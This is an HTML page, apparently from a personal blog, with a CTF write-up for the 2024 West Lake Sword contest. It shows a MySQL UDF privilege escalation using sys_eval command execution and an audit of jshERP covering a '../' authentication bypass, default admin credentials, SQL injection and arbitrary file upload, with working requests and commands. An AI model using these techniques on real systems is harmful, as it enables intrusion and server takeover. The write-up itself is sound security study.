@@ -1,0 +1,1094 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.jpg">
+  <link rel="icon" href="/img/head.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zjacky">
+  <meta name="keywords" content="Zjacky">
+  
+    <meta name="description" content="‍ 前言‍看来现在CTF中直接不出PHP了吗？要出就是出顶级难度的了，我咧个豆，西湖论剑队友通天带我了，真有点猛，复现Java的过程当中还是学到不少东西的，希望下次能够自己独立完成出来吧 ‍ WriteUp‍ Web‍ only_sql‍ 一看可以连恶意mysql读文件 ​ 可以读到源码，格式化后如下 ​ 存在注释的密码 12345&#x2F;&#x2F;mine\n&#x2F;&#x2F;$db_host&#x3D;\&#x27;127.0.0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF - 2024 西湖论剑">
+<meta property="og:url" content="https://zjackky.github.io/post/ctf-2024-west-lake-discuss-sword-z10dq7t.html">
+<meta property="og:site_name" content="Zjacky Blog">
+<meta property="og:description" content="‍ 前言‍看来现在CTF中直接不出PHP了吗？要出就是出顶级难度的了，我咧个豆，西湖论剑队友通天带我了，真有点猛，复现Java的过程当中还是学到不少东西的，希望下次能够自己独立完成出来吧 ‍ WriteUp‍ Web‍ only_sql‍ 一看可以连恶意mysql读文件 ​ 可以读到源码，格式化后如下 ​ 存在注释的密码 12345&#x2F;&#x2F;mine\n&#x2F;&#x2F;$db_host&#x3D;\&#x27;127.0.0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020181.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020524.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020681.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020822.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020979.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020407.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020567.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021026539.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020924.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020082.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020256.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020414.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020567.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020736.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020894.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020051.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020203.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020360.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020536.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020688.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020857.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020373.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020530.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020705.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020857.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020015.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020160.png!thumbnail">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020348.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020512.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020670.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020827.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020973.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020142.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020307.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020462.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020605.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020758.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020912.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020431.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020575.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020728.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020883.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020188.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020329.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020499.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020657.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020813.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020969.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020113.jpg">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020270.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020643.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020783.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020001.png">
+<meta property="article:published_time" content="2024-02-02T02:09:24.000Z">
+<meta property="article:modified_time" content="2024-02-02T02:20:24.000Z">
+<meta property="article:author" content="Zjacky">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020181.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CTF - 2024 西湖论剑 - Zjacky Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zjackky.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"$","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zjacky&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF - 2024 西湖论剑"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-02 10:09" pubdate>
+          2024年2月2日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          48 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTF - 2024 西湖论剑</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>‍</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>‍看来现在CTF中直接不出PHP了吗？要出就是出顶级难度的了，我咧个豆，西湖论剑队友通天带我了，真有点猛，复现Java的过程当中还是学到不少东西的，希望下次能够自己独立完成出来吧</p>
+<p>‍</p>
+<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><p>‍</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>‍</p>
+<h3 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h3><p>‍</p>
+<p>一看可以连恶意mysql读文件</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020181.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>可以读到源码，格式化后如下</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020524.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>存在注释的密码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">//mine\n<br>//$db_host=\&#x27;127.0.0.1\&#x27;;\n<br>//$db_username=\&#x27;root\&#x27;;\n<br>//$db_password=\&#x27;1q2w3e4r5t!@#\&#x27;;\n<br>//$db_name=\&#x27;mysql\&#x27;;\n\n<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>则可以直接连接进行操作，发现慢日志没办法提示给了<code>LOAD DATA</code>​尝试写文件发现写不进去于是尝试UDF提权</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020681.png" srcset="/img/loading.gif" lazyload alt="9159353c62f674503b0edfb9f6f335f">​</p>
+<p>先读取插件存在的位置</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;plugin_dir&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>得到插件目录为<code>/usr/lib/mysql/p1ugin</code>​</p>
+<p>然后进行UDF恶意文件加载(注意是<code>so</code>​)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4</span>...  <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/p1ugin/udfa.so&#x27;</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> &quot;sys_exec&quot;; # 查看<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname &quot;udfa.so&quot;;# 创建函数绑定dll<br><span class="hljs-keyword">select</span> sys_eval(&quot;whoami&quot;);# 调用函数进行命令执行<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>然后查看当前环境变量出flag(我真找了两个小时的flag和提权的方式我真的受不了了)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">POST <span class="hljs-operator">/</span>query.php HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">1.14</span><span class="hljs-number">.108</span><span class="hljs-number">.193</span>:<span class="hljs-number">31358</span><br>Content<span class="hljs-operator">-</span>Length: <span class="hljs-number">31</span><br>Cache<span class="hljs-operator">-</span>Control: max<span class="hljs-operator">-</span>age<span class="hljs-operator">=</span><span class="hljs-number">0</span><br>Upgrade<span class="hljs-operator">-</span>Insecure<span class="hljs-operator">-</span>Requests: <span class="hljs-number">1</span><br>Origin: http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">1.14</span><span class="hljs-number">.108</span><span class="hljs-number">.193</span>:<span class="hljs-number">31358</span><br>Content<span class="hljs-operator">-</span>Type: application<span class="hljs-operator">/</span>x<span class="hljs-operator">-</span>www<span class="hljs-operator">-</span>form<span class="hljs-operator">-</span>urlencoded<br><span class="hljs-keyword">User</span><span class="hljs-operator">-</span>Agent: Mozilla<span class="hljs-operator">/</span><span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-operator">/</span><span class="hljs-number">537.36</span> (KHTML, <span class="hljs-keyword">like</span> Gecko) Chrome<span class="hljs-operator">/</span><span class="hljs-number">115.0</span><span class="hljs-number">.5790</span><span class="hljs-number">.171</span> Safari<span class="hljs-operator">/</span><span class="hljs-number">537.36</span><br>Accept: text<span class="hljs-operator">/</span>html,application<span class="hljs-operator">/</span>xhtml<span class="hljs-operator">+</span>xml,application<span class="hljs-operator">/</span>xml;q<span class="hljs-operator">=</span><span class="hljs-number">0.9</span>,image<span class="hljs-operator">/</span>avif,image<span class="hljs-operator">/</span>webp,image<span class="hljs-operator">/</span>apng,<span class="hljs-operator">*</span><span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Referer: http://1.14.108.193:31358/query.php</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1706580382; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1706580914; PHPSESSID=cucaobemah665l6748uoeifqvo</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">db_command=select%20sys_eval(%22env%22)%3B</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020822.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="EZerp"><a href="#EZerp" class="headerlink" title="EZerp"></a>EZerp</h3><p>‍</p>
+<p>这个题先放出之前审的ERP的文章，因为这个题是考ERP的，之前审过，但并不是最新版的，审的是2.3的版本，而最新的3.1版本的改了蛮多功能点的，所以这个题我觉得出的还是不错的，让我再次回顾了下关于ERP的内容吧</p>
+<p>‍</p>
+<h4 id="Java审计-华夏ERP"><a href="#Java审计-华夏ERP" class="headerlink" title="Java审计 - 华夏ERP"></a>Java审计 - 华夏ERP</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>系统就存在一个 <code>fliter</code>​ 在 <code>LogCostFilter</code>​ 里面会检查 <code>session</code>​ 来判断用户是否登录，如果没有登录就会让他重定向到 <code>login.html</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020979.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h5 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h5><p>‍</p>
+<h6 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h6><p>可以发现这个拦截器是根据</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br></code></pre></td></tr></table></figure>
+
+<p>获取的内容来进行判断的，然后根据获取到的<code>requestUrl</code>​来进行是否进行拦截，并且并不是检索最后，而是使用了<code>contains()</code>​方法，又因为<code>getRequestURI()</code>​方法是完全获取URI的，并没有特殊字符的过滤(Java常见权限绕过的关键方法了) ，所以可以使用<code>../</code>​来进行权限绕过</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020407.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>正常管理员操作查询商品信息，这里删掉Cookie后被拦截器返回到<code>login.html</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020567.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>在访问的路径中加入<code>login.html/../</code>​发现正常请求了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021026539.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个看了一下其他版本的都是通病吧，只要是用的是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br></code></pre></td></tr></table></figure>
+
+<p>后续在西湖论剑的CTF当中就是个明显例子</p>
+<p>‍</p>
+<p>这里也提一下吧，踩坑记录了属实是，主要是在本地vue起不来前端(难受得一)，所以用权限绕过的方式来获取admin的token来进行后端的操作，可以先获取admin的账号密码(默认admin&#x2F;123456)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /jshERP-boot/user/login HTTP/1.1<br>Host: 10.33.232.182:9999<br>Accept: application/json, text/javascript, */*; q=0.01<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Type: application/json<br>Content-Length: 57<br>Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1706798797; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1706809824; JSESSIONID=BE0AA125744B2BF49540A1BE0FC541EB<br>Origin: http://10.33.232.182:8080<br>Referer: http://10.33.232.182:8080/login.html<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br><br>&#123;&quot;loginName&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020924.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>获取到token后把token的值加入<code>X-Access-Token</code>​ 这个header中即可以管理员权限来操作了</p>
+<p><code>X-Access-Token: 4ef85bce98444cefa6eae9e9d67cbeb5_0</code>​</p>
+<p>‍</p>
+<h6 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h6><p>由于华夏ERP使用的是mybatis，所以直接在对应的mapper文件中搜索<code>$&#123;</code>​即可</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.7.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020082.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>这可太多了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020256.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>通过接口层 实现层 控制层，最后找到<code>/Users/zjacky/Documents/Java_project/jshERP-2.3/src/main/java/com/jsh/erp/controller/ResourceController.java </code>​</p>
+<p>在这个控制器中发现sql传入的点是可控的</p>
+<p>‍</p>
+<h6 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h6><p>由于权限绕过了直接全局搜索<code>upload</code>​</p>
+<p>存在两个上传点</p>
+<p>‍</p>
+<ol>
+<li><code>\jshERP-3.1\jshERP-boot\src\main\java\com\jsh\erp\controller\SystemConfigController.java</code>​</li>
+<li><code>\jshERP-3.1\jshERP-boot\src\main\java\com\jsh\erp\controller\PluginController.java</code>​</li>
+</ol>
+<p>‍</p>
+<p>第二个上传点在后续RCE说，这里直接看<code>SystemConfig</code>​的上传</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020414.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现是任意文件上传，并且接收<code>biz</code>​参数传递,然后跟进下<code>uploadLocal</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020567.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现就是进行文件取名，但是后缀自定义，然后根据传入的<code>biz</code>​的路径进行上传，并且如果不存在目录就立刻创建该目录</p>
+<p>‍</p>
+<p>(这里省略一个小时的环境配置时间—真操蛋)然后终于上传成功了，一个完美的可以跨越任意目录的任意文件上传</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020736.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
